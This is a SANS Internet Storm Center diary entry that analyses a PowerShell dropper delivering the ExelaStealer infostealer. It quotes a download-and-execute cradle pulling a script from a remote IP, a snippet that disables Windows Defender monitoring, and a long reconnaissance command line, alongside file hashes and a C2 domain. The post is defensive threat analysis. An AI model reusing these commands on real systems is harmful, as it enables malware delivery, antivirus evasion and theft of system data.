---
title: ExelaStealer Delivered "From Russia With Love", (Fri, Jul 26th)
url: https://isc.sans.edu/diary/rss/31118
source: SANS Internet Storm Center, InfoCON: green
date: 2024-07-27
fetch_date: 2025-10-06T17:44:20.049094
---

# ExelaStealer Delivered "From Russia With Love", (Fri, Jul 26th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31116)
* [next](/diary/31120)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [ExelaStealer Delivered "From Russia With Love"](/forums/diary/ExelaStealer%2BDelivered%2BFrom%2BRussia%2BWith%2BLove/31118/)

**Published**: 2024-07-26. **Last Updated**: 2024-07-26 11:51:44 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/ExelaStealer%2BDelivered%2BFrom%2BRussia%2BWith%2BLove/31118/#comments)

Some simple PowerShell scripts might deliver nasty content if executed by the target. I found a very simple one (with a low VT score of 8/65):

```

$webclient = New-Object System.Net.WebClient
$webclient.Headers.Add("X-Requested-With", "PowerShell")
$script = $webclient.DownloadString("hxxp://147[.]45[.]159[.]206/open.ps1")
Invoke-Expression $script
```

The file "open.ps1" is downloaded from Russia and contains comments in Russian like "Function of real-life security protection". It will try to disable the antivirus or, if not possible, it will ask the victim to do it!

```

// Decoded: "Press d when u turn off Tamper Protect!"
$ready = Read-Host
([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJlc3MgZCB3aGVuIHUgdHVybiBvZmYgVGFtcGVyIFByb3RlY3Qh")))

if ($ready -eq "d") {
    Try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Host "1"
    }
    Catch {
       Write-Host "2"
    }
}
else {
    // Decoded: "Canceled!"
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2FuY2VsZWQh")))
    exit
}
```

Then, the script tries to download two PE files:

* cmd.exe (SHA256: 97d6e2d922c2f69cb84341b238966555820f0b46375a9e0e1a1a19a5f42a8f96)
* service.exe (SHA256: de223760fd87d21d3548ab96e810f7c0c16aeea156905845d2e3c81e1e7df663)

"cmd.exe" is a self-extracting RAR archive:

```

remnux@remnux:MalwareZoo/20240726$ rar t cmd.exe

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help

Testing archive cmd.exe

Testing     comCommon.exe                                             OK
Testing     OejMizBn6qpQO.vbe                                         OK
Testing     e0FFDTJuwoKvrdf9FE4ACLcGB7vDN5I0giWGmO2aDyI3QEuN.bat      OK
All OK
```

It communicates with solararbx[.]online ([37.140.192.207](/ipinfo.html?ip=37.140.192.207)). At this time, I'm not sure about the purpose of the RAR archive.

"service.exe" is the Exela[[1](https://github.com/quicaxd/Exela-V2.0)] stealer, developed in Python and compiled into a PE file. It uses Discord as C2 channel. Reconnaissance is performed via a simple script:

```

C:\Windows\system32\cmd.exe /c "echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config"
```

[1] <https://github.com/quicaxd/Exela-V2.0>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Malware](/tag.html?tag=Malware) [Python](/tag.html?tag=Python) [Stealer](/tag.html?tag=Stealer) [Exelastealer](/tag.html?tag=Exelastealer) [Russia](/tag.html?tag=Russia)

[0 comment(s)](/diary/ExelaStealer%2BDelivered%2BFrom%2BRussia%2BWith%2BLove/31118/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31116)
* [next](/diary/31120)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)